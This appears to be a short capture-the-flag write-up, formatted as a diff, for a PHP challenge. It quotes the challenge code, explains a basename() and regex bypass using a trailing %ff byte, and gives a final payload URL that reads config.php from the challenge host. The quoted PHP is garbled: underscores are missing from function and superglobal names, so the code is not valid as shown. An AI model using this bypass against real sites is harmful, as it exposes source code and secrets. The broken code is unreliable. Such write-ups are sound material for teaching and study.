@@ -1,0 +1,29 @@
+Can You Guess It?
+```php
+
+if (pregmatch('/config.php\/*$/i', $SERVER['PHP_SELF'])) {
+  exit("I don't know what you are thinking, but I won't let you read it :)");
+}
+if (isset($GET['source'])) {
+  highlightfile(basename($SERVER['PHPSELF']));
+  exit();
+}
+$secret = bin2hex(randombytes(64));
+if (isset($POST['guess'])) {
+  $guess = (string) $POST['guess'];
+  if (hashequals($secret, $guess)) {
+    $message = 'Congratulations! The flag is: ' . FLAG;
+  } else {
+    $message = 'Wrong.';
+  }
+}
+?>
+```
+
+basename() ignores invalid bytes at the end of path (/config.php/%ff returns config.php)
+Invalid chars at the end of the path bypasses the regex.
+
+Final Payload:
+
+http://18.179.178.246:8003/index.php/config.php/%ff?source
+
